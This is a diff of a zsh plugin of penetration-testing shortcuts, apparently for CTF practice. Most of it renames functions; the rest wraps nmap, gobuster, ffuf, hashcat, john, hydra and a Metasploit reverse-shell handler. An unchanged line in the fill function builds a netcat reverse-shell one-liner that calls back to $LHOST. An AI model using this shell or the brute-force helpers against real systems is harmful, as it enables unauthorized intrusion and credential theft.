@@ -4,9 +4,11 @@
 # VARIABLES
 #
 
-export DIRLIST="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
+export DIR_COMMON="/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
+export DIR_MEDIUM="/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
 export HAKVARS=~/hakvars
 export PASSLIST="/usr/share/wordlists/rockyou.txt"
+export SECLISTS="/usr/share/wordlists/seclists"
 
 #
 # ALIASES
@@ -15,9 +17,10 @@ export PASSLIST="/usr/share/wordlists/rockyou.txt"
 alias dlcu='tpl certutil'
 alias dlps='tpl ps_dl'
 alias f='focus'
-alias hcat='h_hashcat'
+alias hcat='h-hashcat'
 alias hcatshow='hashcat --show'
-alias jrock='john --wordlist=$PASSLIST'
+alias hrock='hydra -VI -P $PASSLIST'
+alias jrock='john --wordlist=$PASSLIST --pot=john.txt'
 alias jshow='john --show'
 alias msf=msfconsole
 alias s='sync'
@@ -31,7 +34,7 @@ alias vpnshow='pgrep -a openvpn'
 # FUNCTIONS
 #
 
-add_host(){
+add-host() {
     HOST=${1:="rhost"}
     IP=${2:-$RHOST}
     sudo sed -i /$HOST$/d /etc/hosts
@@ -40,8 +43,10 @@ add_host(){
 
 clip() {
     FILE=$1
+    cat $FILE
     cat $FILE | xclip -selection clipboard
 }
+
 
 fill() {
     cmd="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST $LPORT > /tmp/f"
@@ -56,22 +61,21 @@ focus() {
     [[ "$IP" != "EMPTY" ]] && export RHOST="$IP"
     [[ "$PORT" != "EMPTY" ]] && export RPORT="$PORT"
     # Add target to hosts file as rhost replacing as necessary
-    add_host
+    add-host
     # Add variables to sync $HAKVARS file 
     sed -i "/export RHOST=*/d" $HAKVARS
     echo "export RHOST=$RHOST" >> $HAKVARS
     sed -i "/export RPORT=*/d" $HAKVARS
     echo "export RPORT=$RPORT" >> $HAKVARS
-    echo -e "\$RHOST: ${RHOST:-"NOT SET"}\n\$RPORT: ${RPORT:-"NOT SET"}\n"
 }
 
 play() {
     CMD=${1:-"info"}
     if [[ $CMD == "info" ]]; then
-        cat ~/.oh-my-zsh/custom/plugins/tg_hacker/commands | cut -d "#" -f 1
+        cat ~/.oh-my-zsh/custom/plugins/tg-hacker/commands | cut -d "#" -f 1
         return
     fi
-    eval $(grep "$CMD" ~/.oh-my-zsh/custom/plugins/tg_hacker/commands | cut -d "#" -f 2 )
+    eval $(grep "$CMD" ~/.oh-my-zsh/custom/plugins/tg-hacker/commands | cut -d "#" -f 2 )
 } 
 
 # Set local callback port
@@ -123,13 +127,13 @@ serve() {
 sync() {
     base=${1:-$(pwd)}
     if [[ ! -f $HAKVARS ]]; then
-        h_init
+        h-init
     fi
     sed -i "/^base=/d" $HAKVARS
     echo "base=$base" >> $HAKVARS
     . $HAKVARS
     cat $HAKVARS
-    . ~/.oh-my-zsh/custom/plugins/tg_hacker/tg_hacker.plugin.zsh
+    . ~/.oh-my-zsh/custom/plugins/tg-hacker/tg-hacker.plugin.zsh
 }
 
 #
@@ -137,7 +141,7 @@ sync() {
 #
 
 # Initialize ctf folder
-h_init() {
+h-init() {
     base=${1:-$(pwd)}
     [[ -d $base ]] || mkdir -p $base
     cd $base
@@ -149,40 +153,51 @@ h_init() {
     touch notes.txt
 }
 
-h_ffuf(){
+h-ffuf(){
     HOST=${2:-$RHOST}
     PORT=${1:-80}
-    WORDLIST=${3:-$DIRLIST}
+    WORDLIST=${3:-$DIR_MEDIUM}
     OUTPUT=ffuf.$IP-$PORT.txt
     touch $OUTPUT
     ffuf -w $WORDLIST -u http://$HOST:$PORT/FUZZ -o $OUTPUT -of csv -c 
 }
 
-h_gobuster(){
+h-gobuster(){
     HOST=${1:-$RHOST}
     PORT=${2:-80}
-    WORDLIST=${3:-$DIRLIST}
+    WORDLIST=${3:-$DIR_MEDIUM}
     OUTPUT=gobuster.$IP-$PORT.txt
     touch $OUTPUT
     echo "gobuster dir -t 50 -o $OUTPUT -w $WORDLIST -u http://$HOST:$PORT -x html,php,txt,js,css,py"
     gobuster dir -t 50 -o $OUTPUT -w "$WORDLIST" -u http://"$HOST":"$PORT" -x html,php,txt,js,css,py
 }
 
-h_hashcat() {
-    MODE=${1}
-    HASHES=${2:-"hashes.txt"}
-    ATTACK=${3:-0}
+h-hashcat() {
+    ATTACK=${1:-0}
+    MODE=${2:-0}
+    HASHES=${3:-hashes.txt}
     WORDLIST=${4:-"$PASSLIST"}
-    echo "hashcat -m $MODE -a $ATTACK $HASHES $WORDLIST"
-    hashcat -m $MODE -a $ATTACK $HASHES $WORDLIST
+    OUTPUT="hashcat.txt"
+    echo "hashcat -a $ATTACK -m $MODE -o $OUTPUT $HASHES $WORDLIST"
+    hashcat -a $ATTACK -m $MODE -o $OUTPUT $HASHES $WORDLIST
 }
 
-h_ssh() {
+h-hashcatshow() {
+    ATTACK=${1:-0}
+    MODE=${2:-0}
+    HASHES=${3:-"hashes.txt"}
+    WORDLIST=${4:-"$PASSLIST"}
+    OUTPUT="hashcat.txt"
+    echo "hashcat --show -m $MODE $HASHES"
+    hashcat --show -m $MODE $HASHES
+}
+
+h-ssh() {
     sshclean
     ssh "$@"
 }
 
-h_web() {
+h-web() {
     PORT=${1:-80}
     IP=${2:-$RHOST}
     OUTPUT=nikto.txt
@@ -195,21 +210,21 @@ h_web() {
 # NMAP
 #
 
-alias nmap_ "sudo nmap -vv -Pn -n -T5"
-alias nmap_basic="sudo nmap -vv -Pn -n -T5 -oN nmap.basic.txt"
-alias nmap_basic_all="sudo nmap -vv -Pn -n -T5 -p- -oN nmap.basic.all.txt"
-alias nmap_full="sudo nmap -vv -n -T5 -A -oN nmap.full.txt"
-alias nmap_full_all="sudo nmap -vv -n -T5 -A -p- -oN nmap.full.all.txt"
-alias nmap_script="sudo nmap -vv -Pn -n -T5 -sC -sV -oN nmap.script.txt"
-alias nmap_script_all="sudo nmap -vv -Pn -n -T5 -sC -sV -p- -oN nmap.script.all.txt"
+alias nmap- "sudo nmap -vv -Pn -n -T5"
+alias nmap-basic="sudo nmap -vv -Pn -n -T5 -oN nmap.basic.txt"
+alias nmap-basic-all="sudo nmap -vv -Pn -n -T5 -p- -oN nmap.basic.all.txt"
+alias nmap-full="sudo nmap -vv -n -T5 -A -oN nmap.full.txt"
+alias nmap-full-all="sudo nmap -vv -n -T5 -A -p- -oN nmap.full.all.txt"
+alias nmap-script="sudo nmap -vv -Pn -n -T5 -sC -sV -oN nmap.script.txt"
+alias nmap-script-all="sudo nmap -vv -Pn -n -T5 -sC -sV -p- -oN nmap.script.all.txt"
 
-nmap_get_ports(){
+nmap-get-ports(){
     IP=${1:-$ip}
     sudo nmap -vv -Pn -T4 -p- $IP -oN nmap.ports.txt
-    nmap_parse_ports
+    nmap-parse-ports
 }
 
-nmap_parse_ports() {
+nmap-parse-ports() {
     FILE=${1:-"nmap.ports.txt"} 
     RPORTS=$(cat $FILE | grep -P '^\d+' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//);
     sed -i "/^export RPORTS=*/d" $HAKVARS
@@ -221,7 +236,7 @@ nmap_parse_ports() {
 # METASPLOIT
 #
 
-msf_handle() {
+msf-handle() {
     payloads=("linux/x64/meterpreter/reverse_tcp" "linux/x64/shell_reverse_tcp" "linux/x86/meterpreter/reverse_tcp" "linux/x86/shell_reverse_tcp" "windows/meterpreter/reverse_tcp" "windows/x64/meterpreter/reverse_tcp")
     select PAYLOAD in "${payloads[@]}"; do
         echo "msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;'"
